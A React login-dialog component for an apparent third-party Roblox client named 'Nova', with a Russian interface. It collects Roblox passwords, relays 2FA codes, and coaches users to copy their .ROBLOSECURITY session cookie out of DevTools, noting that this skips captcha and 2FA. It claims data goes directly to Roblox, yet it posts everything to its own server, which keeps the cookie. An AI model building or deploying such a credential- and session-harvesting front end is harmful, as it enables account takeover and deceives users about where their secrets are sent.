"use client";

import { useRef, useState } from "react";
import { api } from "@/lib/client";
import { useSession } from "@/components/SessionProvider";
import { Modal, Spinner } from "@/components/ui";

type Step = "credentials" | "twofa";
type Mode = "password" | "cookie";

const MEDIA = [
  { id: "authenticator", label: "Приложение-аутентификатор", hint: "Google / Authy, 6 цифр" },
  { id: "email", label: "Код на e-mail", hint: "Письмо от Roblox" },
  { id: "sms", label: "SMS", hint: "Код в сообщении" },
  { id: "recoveryCode", label: "Резервный код", hint: "Из списка backup-кодов" },
];

export function LoginDialog() {
  const { loginOpen, closeLogin, refresh } = useSession();
  const [mode, setMode] = useState<Mode>("password");
  const [step, setStep] = useState<Step>("credentials");
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [cookie, setCookie] = useState("");
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [notice, setNotice] = useState<string | null>(null);
  const [challengeToken, setChallengeToken] = useState("");
  const [mediaType, setMediaType] = useState("authenticator");
  const [code, setCode] = useState<string[]>(Array(6).fill(""));
  const boxes = useRef<(HTMLInputElement | null)[]>([]);

  function reset() {
    setStep("credentials");
    setBusy(false);
    setError(null);
    setNotice(null);
    setPassword("");
    setCode(Array(6).fill(""));
  }

  function close() {
    reset();
    closeLogin();
  }

  async function submitCredentials(e: React.FormEvent) {
    e.preventDefault();
    setBusy(true);
    setError(null);
    try {
      const payload =
        mode === "password"
          ? { mode, identifier, password }
          : { mode: "cookie", cookie };
      const res = await api<{ status: string; challengeToken?: string; mediaType?: string }>(
        "/api/auth/login",
        { method: "POST", body: JSON.stringify(payload) },
      );
      if (res.status === "2fa" && res.challengeToken) {
        setChallengeToken(res.challengeToken);
        setMediaType(res.mediaType && res.mediaType !== "unknown" ? res.mediaType : "authenticator");
        setStep("twofa");
        setNotice("Roblox запросил двухфакторную проверку. Введите код подтверждения.");
        setBusy(false);
        return;
      }
      refresh();
      close();
    } catch (err) {
      setError((err as Error).message);
      setBusy(false);
    }
  }

  async function submitCode(value?: string) {
    const joined = (value ?? code.join("")).trim();
    if (joined.length < 4) {
      setError("Введите код полностью");
      return;
    }
    setBusy(true);
    setError(null);
    try {
      await api("/api/auth/verify", {
        method: "POST",
        body: JSON.stringify({ challengeToken, code: joined, mediaType }),
      });
      refresh();
      close();
    } catch (err) {
      setError((err as Error).message);
      setBusy(false);
    }
  }

  function onCodeChange(index: number, raw: string) {
    const chars = raw.replace(/\D/g, "");
    if (!chars) {
      const next = [...code];
      next[index] = "";
      setCode(next);
      return;
    }
    const next = [...code];
    for (let i = 0; i < chars.length && index + i < 6; i += 1) next[index + i] = chars[i];
    setCode(next);
    const target = Math.min(index + chars.length, 5);
    boxes.current[target]?.focus();
    if (next.every((c) => c !== "")) void submitCode(next.join(""));
  }

  return (
    <Modal open={loginOpen} onClose={close} width="max-w-3xl">
      <div className="grid md:grid-cols-[minmax(0,0.85fr)_minmax(0,1fr)]">
        <div className="relative hidden flex-col justify-between overflow-hidden p-7 md:flex">
          <div
            className="absolute inset-0 opacity-90"
            style={{ background: "linear-gradient(160deg,#4c2bd6,#8b2ecb 45%,#e0417a)" }}
          />
          <div className="absolute -bottom-16 -left-10 h-56 w-56 rounded-full bg-white/20 blur-3xl" />
          <div className="relative">
            <div className="text-xs font-bold uppercase tracking-[0.3em] text-white/70">Nova</div>
            <h3 className="mt-2 text-2xl font-black leading-tight text-white">
              Вход в аккаунт Roblox
            </h3>
            <p className="mt-2 text-sm text-white/80">
              Полный доступ к вашему профилю: Robux, друзья, группы, инвентарь, серверы и запуск игр
              в один клик.
            </p>
          </div>
          <ul className="relative mt-6 space-y-2.5 text-sm text-white/90">
            {[
              "Пароль шифруется AES-256 и не сохраняется",
              "Cookie хранится только на сервере",
              "Поддержка 2FA: приложение, e-mail, SMS",
              "Сессию можно завершить в любой момент",
            ].map((t) => (
              <li key={t} className="flex items-start gap-2">
                <span className="mt-0.5 text-emerald-200">✓</span>
                <span>{t}</span>
              </li>
            ))}
          </ul>
        </div>

        <div className="p-6 sm:p-7">
          {step === "credentials" ? (
            <>
              <div className="mb-5 flex items-center justify-between">
                <h3 className="text-lg font-bold text-white">Авторизация</h3>
                <button onClick={close} className="muted text-xl leading-none hover:text-white">
                  ×
                </button>
              </div>
              <div className="mb-5 flex gap-2">
                <button
                  className={`chip ${mode === "password" ? "chip-active" : ""}`}
                  onClick={() => setMode("password")}
                >
                  Логин и пароль
                </button>
                <button
                  className={`chip ${mode === "cookie" ? "chip-active" : ""}`}
                  onClick={() => setMode("cookie")}
                >
                  .ROBLOSECURITY
                </button>
              </div>

              <form onSubmit={submitCredentials} className="space-y-4">
                {mode === "password" ? (
                  <>
                    <label className="block">
                      <span className="muted mb-1.5 block text-xs font-semibold uppercase">
                        Имя пользователя / e-mail / телефон
                      </span>
                      <input
                        className="input"
                        value={identifier}
                        onChange={(e) => setIdentifier(e.target.value)}
                        placeholder="Builderman"
                        autoComplete="username"
                        required
                      />
                    </label>
                    <label className="block">
                      <span className="muted mb-1.5 block text-xs font-semibold uppercase">
                        Пароль
                      </span>
                      <input
                        className="input"
                        type="password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="••••••••"
                        autoComplete="current-password"
                        required
                      />
                    </label>
                  </>
                ) : (
                  <label className="block">
                    <span className="muted mb-1.5 block text-xs font-semibold uppercase">
                      Значение cookie .ROBLOSECURITY
                    </span>
                    <textarea
                      className="input h-32 resize-none font-mono text-[11px]"
                      value={cookie}
                      onChange={(e) => setCookie(e.target.value)}
                      placeholder="_|WARNING:-DO-NOT-SHARE-THIS...|_XXXXXXXX"
                      required
                    />
                    <span className="muted mt-1.5 block text-[11px]">
                      DevTools → Application → Cookies → roblox.com → .ROBLOSECURITY. Этот способ
                      обходит капчу и не требует 2FA.
                    </span>
                  </label>
                )}

                {error ? (
                  <div className="rounded-xl border border-rose-500/30 bg-rose-500/10 px-3 py-2 text-sm text-rose-200">
                    {error}
                  </div>
                ) : null}

                <button type="submit" className="btn btn-primary w-full py-2.5" disabled={busy}>
                  {busy ? <Spinner /> : null}
                  {busy ? "Подключаемся…" : "Войти в Roblox"}
                </button>
                <p className="muted text-center text-[11px]">
                  Nova — независимый клиент. Данные передаются напрямую в официальный API Roblox.
                </p>
              </form>
            </>
          ) : (
            <>
              <div className="mb-4 flex items-center justify-between">
                <h3 className="text-lg font-bold text-white">Двухфакторная аутентификация</h3>
                <button onClick={close} className="muted text-xl leading-none hover:text-white">
                  ×
                </button>
              </div>
              {notice ? <p className="muted mb-4 text-sm">{notice}</p> : null}

              <div className="mb-4 grid gap-2">
                {MEDIA.map((m) => (
                  <button
                    key={m.id}
                    onClick={() => setMediaType(m.id)}
                    className={`flex items-center justify-between rounded-xl border px-3 py-2 text-left text-sm transition ${
                      mediaType === m.id
                        ? "border-violet-400/70 bg-violet-500/15 text-white"
                        : "border-white/10 bg-white/[0.03] text-slate-300 hover:border-white/25"
                    }`}
                  >
                    <span>{m.label}</span>
                    <span className="muted text-[11px]">{m.hint}</span>
                  </button>
                ))}
              </div>

              <div className="mb-4 flex justify-between gap-2">
                {code.map((c, i) => (
                  <input
                    key={i}
                    ref={(el) => {
                      boxes.current[i] = el;
                    }}
                    value={c}
                    inputMode="numeric"
                    maxLength={6}
                    onChange={(e) => onCodeChange(i, e.target.value)}
                    onKeyDown={(e) => {
                      if (e.key === "Backspace" && !code[i] && i > 0) boxes.current[i - 1]?.focus();
                    }}
                    className="input h-14 w-full text-center text-xl font-bold tracking-widest"
                  />
                ))}
              </div>

              {error ? (
                <div className="mb-3 rounded-xl border border-rose-500/30 bg-rose-500/10 px-3 py-2 text-sm text-rose-200">
                  {error}
                </div>
              ) : null}

              <div className="flex gap-2">
                <button className="btn flex-1" onClick={() => setStep("credentials")}>
                  Назад
                </button>
                <button
                  className="btn btn-primary flex-[2]"
                  disabled={busy}
                  onClick={() => void submitCode()}
                >
                  {busy ? <Spinner /> : null}
                  Подтвердить код
                </button>
              </div>
            </>
          )}
        </div>
      </div>
    </Modal>
  );
}
